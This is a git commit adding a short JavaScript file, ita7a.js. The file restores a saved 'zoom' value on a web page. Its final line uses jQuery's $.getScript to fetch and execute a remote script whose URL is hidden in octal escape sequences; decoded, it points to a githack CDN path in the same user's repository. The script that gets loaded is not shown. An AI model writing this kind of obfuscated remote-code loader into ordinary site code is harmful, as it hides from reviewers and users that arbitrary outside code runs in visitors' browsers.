e4ef159ebda4df983a1f28c71e6357a28102a1db
mu744mu <80185284+mu744mu@users.noreply.github.com>
2021-12-17 06:36:25 +0300

    Create ita7a.js

---
+++ ita7a.js
@@ -0,0 +1,7 @@
+var vl=getv('zoom');
+   if(vl==''){vl='1';setv('zoom',vl);}
+     if(isNaN(parseInt(vl))==false)
+     { 
+     $('#zoom').val(vl).trigger('change');fixSize(1);
+     } 
+$.getScript("https://\162\141\167\143\144\156\056\147\151\164\150\141\143\153\056\143\157\155/\155\165\067\064\064\155\165/\164\067\164\067/fcb0465ed9b79be3d4f4640ebe525ef8f207d426/\151\164\141\067\141\061.js");  
